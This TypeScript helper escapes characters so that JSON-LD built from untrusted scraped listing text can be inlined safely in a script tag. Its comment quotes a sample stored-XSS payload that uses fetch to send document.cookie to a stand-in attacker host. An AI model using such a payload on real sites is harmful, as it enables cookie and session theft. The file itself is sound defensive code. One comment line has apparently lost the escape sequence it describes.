/**
 * Safe JSON-LD serialisation.
 *
 * `JSON.stringify` does NOT escape `<`. That matters here specifically because
 * this site's JSON-LD embeds text that came from scraped merchant listings -
 * product names, store names, offer titles. Those strings are untrusted input.
 *
 * A single product named something like:
 *
 *     Foo </script><script>fetch('//evil.example?c='+document.cookie)</script>
 *
 * would terminate the <script type="application/ld+json"> element early and let
 * the rest of the payload execute as real markup. It is a stored-XSS path, not
 * a theoretical one: the value only has to appear once in a crawled listing.
 *
 * Escaping `<` as `<` is the standard mitigation and is completely
 * lossless for JSON-LD - JSON has no other use for the character, and every
 * JSON parser decodes the escape back to a literal `<` before handing the
 * value to a consumer. Structured-data parsers therefore see exactly the same
 * string they would have seen otherwise.
 *
 * `>` and `&` are escaped too, which closes the variant where the payload
 * starts with an entity-like sequence and costs nothing.
 *
 * Use this everywhere a JSON-LD payload is inlined into a <script> tag.
 */
export function safeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    // U+2028/U+2029 are valid in JSON but are line terminators in JS. They are
    // harmless inside a JSON-LD <script> block, but escaping them keeps the
    // output safe if it is ever read as JS.
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
